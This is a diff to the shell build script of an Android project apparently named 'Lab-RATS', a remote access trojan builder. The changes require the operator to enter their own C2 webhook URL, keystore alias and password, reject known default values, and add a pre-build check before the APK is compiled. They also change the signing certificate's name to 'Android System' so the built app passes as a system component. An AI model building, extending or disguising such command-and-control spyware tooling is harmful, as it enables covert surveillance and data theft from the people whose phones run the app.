@@ -141,10 +141,23 @@ generate_keystore() {
     fi
     
     echo -e "${CYAN}[*] Keystore Configuration${NC}"
-    read -p "    Key alias [lab-rats-key]: " ALIAS; ALIAS=${ALIAS:-lab-rats-key}
-    read -p "    Password [lab-rats123]: " PASS; PASS=${PASS:-lab-rats123}
+    echo -e "${YELLOW}    (No default values: alias and password are REQUIRED.)${NC}"
+    read -p "    Key alias (required): " ALIAS
+    if [ -z "$ALIAS" ]; then
+        echo -e "${RED}[!] ABORTED: Keystore alias is required. No default alias is provided.${NC}"
+        return 1
+    fi
+    read -s -p "    Password (required, 12+ chars): " PASS; echo
+    if [ -z "$PASS" ]; then
+        echo -e "${RED}[!] ABORTED: A keystore password is required. No default password is provided.${NC}"
+        return 1
+    fi
+    if [ "$PASS" == "lab-rats123" ] || [ ${#PASS} -lt 12 ]; then
+        echo -e "${RED}[!] ABORTED: 'lab-rats123' is blocked and the password must be 12+ chars.${NC}"
+        return 1
+    fi
 
-    keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "$PASS" -keypass "$PASS" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
+    keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "$PASS" -keypass "$PASS" -dname "CN=Android System, O=Local Build, C=US" 2>/dev/null
     
     cat > "$PROJECT_DIR/keystore.properties" << EOF
 storeFile=lab-rats-keystore.jks
@@ -202,8 +215,16 @@ configure_app() {
         read -p "    Enter C2 Webhook URL [Press Enter to Keep Current]: " WEB_URL
         WEB_URL=${WEB_URL:-$EXISTING_WEBHOOK}
     else
-        read -p "    Enter C2 Webhook URL (Google Script or Render): " WEB_URL
+        read -p "    Enter C2 Webhook URL (Google Script or Render, REQUIRED): " WEB_URL
     fi
+
+    # Reject empty / known-default C2 values
+    case "$WEB_URL" in
+        ""|AndroidKernel1337|TacticalKey2026SecureGCM|admin1337|lab-rats123)
+            echo -e "${RED}[!] ABORTED: WEBHOOK_URL is empty or matches a blocked default value. Enter your own C2 endpoint.${NC}"
+            return 1
+            ;;
+    esac
 
     if grep -q "WEBHOOK_URL=" "$PROJECT_DIR/local.properties"; then
         sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=$WEB_URL|g" "$PROJECT_DIR/local.properties"
@@ -218,6 +239,12 @@ configure_app() {
     fi
 
     RAND_KEY=$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16)
+    case "$RAND_KEY" in
+        ""|AndroidKernel1337|TacticalKey2026SecureGCM|admin1337|lab-rats123)
+            echo -e "${RED}[!] ABORTED: ENCRYPTION_KEY matched a blocked default value. Retry.${NC}"
+            return 1
+            ;;
+    esac
     if grep -q "ENCRYPTION_KEY=" "$PROJECT_DIR/local.properties"; then
         sed_i "s|ENCRYPTION_KEY=.*|ENCRYPTION_KEY=$RAND_KEY|g" "$PROJECT_DIR/local.properties"
     else
@@ -240,11 +267,31 @@ configure_app() {
             echo -e "${GREEN}[+] Auto-configured Android SDK path: $DETECTED_SDK${NC}"
         fi
     fi
+}
 
-    mkdir -p "$PROJECT_DIR/app/src/main/assets/sys"
-    for i in {1..3}; do
-        head -c 512 /dev/urandom > "$PROJECT_DIR/app/src/main/assets/sys/metadata_$i.dat"
-    done
+# Pre-build validation: WEBHOOK_URL / ENCRYPTION_KEY must not be empty or known defaults
+validate_config() {
+    if [ -f "$PROJECT_DIR/local.properties" ]; then
+        V_WEBHOOK=$(grep "^WEBHOOK_URL=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2-)
+        V_ENCKEY=$(grep "^ENCRYPTION_KEY=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2-)
+    else
+        V_WEBHOOK=""
+        V_ENCKEY=""
+    fi
+    case "$V_WEBHOOK" in
+        ""|AndroidKernel1337|TacticalKey2026SecureGCM|admin1337|lab-rats123)
+            echo -e "${RED}[!] BUILD ABORTED: WEBHOOK_URL is empty or matches a blocked default value. Set your own C2 endpoint first.${NC}"
+            return 1
+            ;;
+    esac
+    case "$V_ENCKEY" in
+        ""|AndroidKernel1337|TacticalKey2026SecureGCM|admin1337|lab-rats123)
+            echo -e "${RED}[!] BUILD ABORTED: ENCRYPTION_KEY is empty or matches a blocked default value. Generate a fresh key first.${NC}"
+            return 1
+            ;;
+    esac
+    echo -e "${GREEN}[✓] Build configuration OK (WEBHOOK_URL & ENCRYPTION_KEY are non-default).${NC}"
+    return 0
 }
 
 # Progress bar function
@@ -289,6 +336,8 @@ execute_build() {
 # Build APK
 build_apk() {
     print_banner
+    echo -e "${CYAN}[*] Validating build configuration...${NC}"
+    validate_config || { read -p "    Press Enter to return to menu..."; return 1; }
     echo -e "${CYAN}[*] Initializing Build Engine...${NC}"
     cd "$PROJECT_DIR"
     chmod +x gradlew
